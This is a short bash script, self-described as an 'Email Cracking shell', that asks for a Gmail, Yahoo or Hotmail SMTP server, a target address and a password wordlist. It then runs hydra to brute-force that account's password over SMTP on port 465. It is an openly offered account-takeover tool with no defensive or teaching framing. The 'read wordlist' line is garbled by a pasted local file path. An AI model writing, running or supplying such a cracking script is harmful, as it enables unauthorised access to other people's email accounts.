#! /bin/bash


echo 8-line Email Cracking shell

echo use appropriate wordlist to use to brute force

echo Choose the SMTP you want to crack: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:

read smtp

echo Email Address to crack:

read email

echo Provide path location ie /desktop/superduperpassword.txt of Wordlist for Passwords:

read wordlist/Users/alexanderhenderson/Desktop/CODE/Shell/bruteforcewithhydra.sh


hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp

